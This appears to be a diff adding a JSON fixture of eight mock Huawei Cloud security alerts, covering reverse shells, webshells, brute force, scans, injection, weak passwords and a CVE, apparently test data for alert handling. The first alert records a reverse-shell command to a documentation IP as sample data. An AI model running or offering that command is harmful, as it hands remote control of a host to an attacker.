@@ -1,0 +1,469 @@
+[
+  {
+    "version": "mock-1.0",
+    "id": "mock-huawei-0001",
+    "domain_id": "mock-domain-100000000001",
+    "region_id": "cn-north-4",
+    "workspace_id": "mock-workspace",
+    "labels": "mock",
+    "first_observed_time": "2026-01-01T00:00:00Z",
+    "last_observed_time": "2026-01-01T00:00:00Z",
+    "create_time": "2026-01-01T00:00:00Z",
+    "arrive_time": "2026-01-01T00:00:00Z",
+    "update_time": "2026-01-01T00:00:00Z",
+    "title": "反弹 Shell 进程",
+    "description": "主机上检测到可疑的反弹 Shell 进程",
+    "source_url": "https://console.example.com/secmaster/alerts/mock-huawei-0001",
+    "count": 1,
+    "confidence": 80,
+    "severity": "Fatal",
+    "criticality": 70,
+    "alert_type": {
+      "category": "Host",
+      "alert_type": "ReverseShell"
+    },
+    "verification_state": "Unknown",
+    "handle_status": "Open",
+    "actor": "mock-actor",
+    "owner": "Mock SOC",
+    "data_source": {
+      "source_type": 1,
+      "domain_id": "mock-domain-100000000001",
+      "project_id": "mock-project",
+      "region_id": "cn-north-4",
+      "company_name": "Huawei Cloud",
+      "product_name": "HSS",
+      "product_feature": "Mock"
+    },
+    "resource_list": [
+      {
+        "id": "ecs-mock-0001",
+        "name": "web-01",
+        "type": "ecs",
+        "provider": "huawei",
+        "region_id": "cn-north-4",
+        "project_id": "mock-project"
+      }
+    ],
+    "network_list": [
+      {
+        "direction": "IN",
+        "protocol": "TCP",
+        "src_ip": "203.0.113.10",
+        "src_port": 44444,
+        "dest_ip": "10.0.0.11",
+        "dest_port": "22"
+      }
+    ],
+    "malware": {
+      "malware_family": "MockShell",
+      "malware_class": "Backdoor"
+    },
+    "system_info": {
+      "command_line": "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1"
+    }
+  },
+  {
+    "version": "mock-1.0",
+    "id": "mock-huawei-0002",
+    "domain_id": "mock-domain-100000000001",
+    "region_id": "cn-north-4",
+    "workspace_id": "mock-workspace",
+    "labels": "mock",
+    "first_observed_time": "2026-01-01T00:00:00Z",
+    "last_observed_time": "2026-01-01T00:00:00Z",
+    "create_time": "2026-01-01T00:00:00Z",
+    "arrive_time": "2026-01-01T00:00:00Z",
+    "update_time": "2026-01-01T00:00:00Z",
+    "title": "Webshell 文件落地",
+    "description": "网站目录发现可疑 PHP Webshell",
+    "source_url": "https://console.example.com/secmaster/alerts/mock-huawei-0002",
+    "count": 2,
+    "confidence": 80,
+    "severity": "High",
+    "criticality": 70,
+    "alert_type": {
+      "category": "Host",
+      "alert_type": "Webshell"
+    },
+    "verification_state": "Unknown",
+    "handle_status": "Open",
+    "actor": "mock-actor",
+    "owner": "Mock SOC",
+    "data_source": {
+      "source_type": 1,
+      "domain_id": "mock-domain-100000000001",
+      "project_id": "mock-project",
+      "region_id": "cn-north-4",
+      "company_name": "Huawei Cloud",
+      "product_name": "HSS",
+      "product_feature": "Mock"
+    },
+    "resource_list": [
+      {
+        "id": "ecs-mock-0002",
+        "name": "web-02",
+        "type": "ecs",
+        "provider": "huawei",
+        "region_id": "cn-north-4",
+        "project_id": "mock-project"
+      }
+    ],
+    "network_list": [
+      {
+        "direction": "IN",
+        "protocol": "TCP",
+        "src_ip": "198.51.100.20",
+        "src_port": 44444,
+        "dest_ip": "10.0.0.21",
+        "dest_port": "22"
+      }
+    ],
+    "malware": {
+      "malware_family": "MockWebshell",
+      "malware_class": "Webshell"
+    }
+  },
+  {
+    "version": "mock-1.0",
+    "id": "mock-huawei-0003",
+    "domain_id": "mock-domain-100000000001",
+    "region_id": "cn-north-4",
+    "workspace_id": "mock-workspace",
+    "labels": "mock",
+    "first_observed_time": "2026-01-01T00:00:00Z",
+    "last_observed_time": "2026-01-01T00:00:00Z",
+    "create_time": "2026-01-01T00:00:00Z",
+    "arrive_time": "2026-01-01T00:00:00Z",
+    "update_time": "2026-01-01T00:00:00Z",
+    "title": "SSH 暴力破解",
+    "description": "短时间内大量 SSH 登录失败",
+    "source_url": "https://console.example.com/secmaster/alerts/mock-huawei-0003",
+    "count": 87,
+    "confidence": 80,
+    "severity": "Medium",
+    "criticality": 70,
+    "alert_type": {
+      "category": "Host",
+      "alert_type": "BruteForce"
+    },
+    "verification_state": "Unknown",
+    "handle_status": "Block",
+    "actor": "mock-actor",
+    "owner": "Mock SOC",
+    "data_source": {
+      "source_type": 1,
+      "domain_id": "mock-domain-100000000001",
+      "project_id": "mock-project",
+      "region_id": "cn-north-4",
+      "company_name": "Huawei Cloud",
+      "product_name": "HSS",
+      "product_feature": "Mock"
+    },
+    "resource_list": [
+      {
+        "id": "ecs-mock-0003",
+        "name": "db-01",
+        "type": "ecs",
+        "provider": "huawei",
+        "region_id": "cn-north-4",
+        "project_id": "mock-project"
+      }
+    ],
+    "network_list": [
+      {
+        "direction": "IN",
+        "protocol": "TCP",
+        "src_ip": "203.0.113.30",
+        "src_port": 44444,
+        "dest_ip": "10.0.0.31",
+        "dest_port": "22"
+      }
+    ]
+  },
+  {
+    "version": "mock-1.0",
+    "id": "mock-huawei-0004",
+    "domain_id": "mock-domain-100000000001",
+    "region_id": "cn-north-4",
+    "workspace_id": "mock-workspace",
+    "labels": "mock",
+    "first_observed_time": "2026-01-01T00:00:00Z",
+    "last_observed_time": "2026-01-01T00:00:00Z",
+    "create_time": "2026-01-01T00:00:00Z",
+    "arrive_time": "2026-01-01T00:00:00Z",
+    "update_time": "2026-01-01T00:00:00Z",
+    "title": "端口扫描",
+    "description": "源 IP 对多个端口发起探测",
+    "source_url": "https://console.example.com/secmaster/alerts/mock-huawei-0004",
+    "count": 24,
+    "confidence": 80,
+    "severity": "Low",
+    "criticality": 70,
+    "alert_type": {
+      "category": "Network",
+      "alert_type": "PortScan"
+    },
+    "verification_state": "Unknown",
+    "handle_status": "Open",
+    "actor": "mock-actor",
+    "owner": "Mock SOC",
+    "data_source": {
+      "source_type": 1,
+      "domain_id": "mock-domain-100000000001",
+      "project_id": "mock-project",
+      "region_id": "cn-north-4",
+      "company_name": "Huawei Cloud",
+      "product_name": "CFW",
+      "product_feature": "Mock"
+    },
+    "resource_list": [
+      {
+        "id": "eip-mock-0004",
+        "name": "mock-eip",
+        "type": "public_ip",
+        "provider": "huawei",
+        "region_id": "cn-north-4",
+        "project_id": "mock-project"
+      }
+    ],
+    "network_list": [
+      {
+        "direction": "IN",
+        "protocol": "TCP",
+        "src_ip": "198.51.100.40",
+        "src_port": 44444,
+        "dest_ip": "10.0.0.41",
+        "dest_port": "443"
+      }
+    ]
+  },
+  {
+    "version": "mock-1.0",
+    "id": "mock-huawei-0005",
+    "domain_id": "mock-domain-100000000001",
+    "region_id": "cn-north-4",
+    "workspace_id": "mock-workspace",
+    "labels": "mock",
+    "first_observed_time": "2026-01-01T00:00:00Z",
+    "last_observed_time": "2026-01-01T00:00:00Z",
+    "create_time": "2026-01-01T00:00:00Z",
+    "arrive_time": "2026-01-01T00:00:00Z",
+    "update_time": "2026-01-01T00:00:00Z",
+    "title": "SQL 注入攻击",
+    "description": "WAF 检测到 UNION SELECT 注入载荷",
+    "source_url": "https://console.example.com/secmaster/alerts/mock-huawei-0005",
+    "count": 8,
+    "confidence": 80,
+    "severity": "High",
+    "criticality": 70,
+    "alert_type": {
+      "category": "Web",
+      "alert_type": "SQLInjection"
+    },
+    "verification_state": "Unknown",
+    "handle_status": "Block",
+    "actor": "mock-actor",
+    "owner": "Mock SOC",
+    "data_source": {
+      "source_type": 1,
+      "domain_id": "mock-domain-100000000001",
+      "project_id": "mock-project",
+      "region_id": "cn-north-4",
+      "company_name": "Huawei Cloud",
+      "product_name": "WAF",
+      "product_feature": "Mock"
+    },
+    "resource_list": [
+      {
+        "id": "domain-mock-0005",
+        "name": "shop.example.com",
+        "type": "domain",
+        "provider": "huawei",
+        "region_id": "cn-north-4",
+        "project_id": "mock-project"
+      }
+    ],
+    "network_list": [
+      {
+        "direction": "IN",
+        "protocol": "TCP",
+        "src_ip": "203.0.113.50",
+        "src_port": 44444,
+        "dest_ip": "10.0.0.51",
+        "dest_port": "443"
+      }
+    ]
+  },
+  {
+    "version": "mock-1.0",
+    "id": "mock-huawei-0006",
+    "domain_id": "mock-domain-100000000001",
+    "region_id": "cn-north-4",
+    "workspace_id": "mock-workspace",
+    "labels": "mock",
+    "first_observed_time": "2026-01-01T00:00:00Z",
+    "last_observed_time": "2026-01-01T00:00:00Z",
+    "create_time": "2026-01-01T00:00:00Z",
+    "arrive_time": "2026-01-01T00:00:00Z",
+    "update_time": "2026-01-01T00:00:00Z",
+    "title": "命令注入攻击",
+    "description": "请求参数携带系统命令",
+    "source_url": "https://console.example.com/secmaster/alerts/mock-huawei-0006",
+    "count": 3,
+    "confidence": 80,
+    "severity": "Fatal",
+    "criticality": 70,
+    "alert_type": {
+      "category": "Web",
+      "alert_type": "CommandInjection"
+    },
+    "verification_state": "Unknown",
+    "handle_status": "Block",
+    "actor": "mock-actor",
+    "owner": "Mock SOC",
+    "data_source": {
+      "source_type": 1,
+      "domain_id": "mock-domain-100000000001",
+      "project_id": "mock-project",
+      "region_id": "cn-north-4",
+      "company_name": "Huawei Cloud",
+      "product_name": "WAF",
+      "product_feature": "Mock"
+    },
+    "resource_list": [
+      {
+        "id": "domain-mock-0006",
+        "name": "api.example.com",
+        "type": "domain",
+        "provider": "huawei",
+        "region_id": "cn-north-4",
+        "project_id": "mock-project"
+      }
+    ],
+    "network_list": [
+      {
+        "direction": "IN",
+        "protocol": "TCP",
+        "src_ip": "198.51.100.60",
+        "src_port": 44444,
+        "dest_ip": "10.0.0.61",
+        "dest_port": "443"
+      }
+    ]
+  },
+  {
+    "version": "mock-1.0",
+    "id": "mock-huawei-0007",
+    "domain_id": "mock-domain-100000000001",
+    "region_id": "cn-north-4",
+    "workspace_id": "mock-workspace",
+    "labels": "mock",
+    "first_observed_time": "2026-01-01T00:00:00Z",
+    "last_observed_time": "2026-01-01T00:00:00Z",
+    "create_time": "2026-01-01T00:00:00Z",
+    "arrive_time": "2026-01-01T00:00:00Z",
+    "update_time": "2026-01-01T00:00:00Z",
+    "title": "SSH 弱口令",
+    "description": "检测到 SSH 允许 root 密码登录",
+    "source_url": "https://console.example.com/secmaster/alerts/mock-huawei-0007",
+    "count": 1,
+    "confidence": 80,
+    "severity": "Medium",
+    "criticality": 70,
+    "alert_type": {
+      "category": "Configuration",
+      "alert_type": "WeakPassword"
+    },
+    "verification_state": "Unknown",
+    "handle_status": "Open",
+    "actor": "mock-actor",
+    "owner": "Mock SOC",
+    "data_source": {
+      "source_type": 1,
+      "domain_id": "mock-domain-100000000001",
+      "project_id": "mock-project",
+      "region_id": "cn-north-4",
+      "company_name": "Huawei Cloud",
+      "product_name": "CSIP",
+      "product_feature": "Mock"
+    },
+    "resource_list": [
+      {
+        "id": "ecs-mock-0007",
+        "name": "bastion-01",
+        "type": "ecs",
+        "provider": "huawei",
+        "region_id": "cn-north-4",
+        "project_id": "mock-project"
+      }
+    ],
+    "network_list": [
+      {
+        "direction": "IN",
+        "protocol": "TCP",
+        "src_ip": "192.0.2.70",
+        "src_port": 44444,
+        "dest_ip": "10.0.0.71",
+        "dest_port": "443"
+      }
+    ]
+  },
+  {
+    "version": "mock-1.0",
+    "id": "mock-huawei-0008",
+    "domain_id": "mock-domain-100000000001",
+    "region_id": "cn-north-4",
+    "workspace_id": "mock-workspace",
+    "labels": "mock",
+    "first_observed_time": "2026-01-01T00:00:00Z",
+    "last_observed_time": "2026-01-01T00:00:00Z",
+    "create_time": "2026-01-01T00:00:00Z",
+    "arrive_time": "2026-01-01T00:00:00Z",
+    "update_time": "2026-01-01T00:00:00Z",
+    "title": "高危漏洞 CVE",
+    "description": "资产存在可被远程利用的高危漏洞",
+    "source_url": "https://console.example.com/secmaster/alerts/mock-huawei-0008",
+    "count": 1,
+    "confidence": 80,
+    "severity": "Tips",
+    "criticality": 70,
+    "alert_type": {
+      "category": "Vulnerability",
+      "alert_type": "CVE"
+    },
+    "verification_state": "Unknown",
+    "handle_status": "Open",
+    "actor": "mock-actor",
+    "owner": "Mock SOC",
+    "data_source": {
+      "source_type": 1,
+      "domain_id": "mock-domain-100000000001",
+      "project_id": "mock-project",
+      "region_id": "cn-north-4",
+      "company_name": "Huawei Cloud",
+      "product_name": "CSIP",
+      "product_feature": "Mock"
+    },
+    "resource_list": [
+      {
+        "id": "ecs-mock-0008",
+        "name": "app-01",
+        "type": "ecs",
+        "provider": "huawei",
+        "region_id": "cn-north-4",
+        "project_id": "mock-project"
+      }
+    ],
+    "network_list": [
+      {
+        "direction": "IN",
+        "protocol": "TCP",
+        "src_ip": "192.0.2.80",
+        "src_port": 44444,
+        "dest_ip": "10.0.0.81",
+        "dest_port": "443"
+      }
+    ]
+  }
+]
